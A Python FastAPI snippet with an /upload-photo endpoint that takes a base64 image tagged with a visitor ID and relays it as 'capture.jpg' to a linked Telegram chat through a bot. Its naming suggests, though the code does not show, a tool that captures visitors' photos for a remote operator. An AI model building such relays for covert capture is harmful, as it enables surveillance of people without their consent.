class PhotoPayload(BaseModel):
    visitor_id: str = Field(min_length=8, max_length=8)
    image_base64: str


@app.post("/upload-photo")
async def upload_photo(payload: PhotoPayload):
    telegram_user_id = get_telegram_user_id(payload.visitor_id)
    if not telegram_user_id:
        return {"status": "error", "message": "Unknown visitor ID."}

    if not BOT_TOKEN:
        return {"status": "error", "message": "Telegram bot token is not configured."}

    # Extract raw base64 data if it contains the data URL header
    image_data = payload.image_base64
    if "," in image_data:
        image_data = image_data.split(",", 1)[1]

    try:
        binary_image = base64.b64decode(image_data)
    except Exception:
        return {"status": "error", "message": "Invalid image data."}

    # Dispatch to Telegram Bot sendPhoto endpoint
    async with httpx.AsyncClient(timeout=20) as client:
        response = await client.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            data={
                "chat_id": telegram_user_id,
                "caption": f"📸 Photo received from Visitor ID: {payload.visitor_id}"
            },
            files={
                "photo": ("capture.jpg", binary_image, "image/jpeg")
            }
        )

    if response.is_error:
        return {"status": "error", "message": f"Telegram API failed: {response.text}"}

    return {"status": "sent", "message": "Photo sent to Telegram."}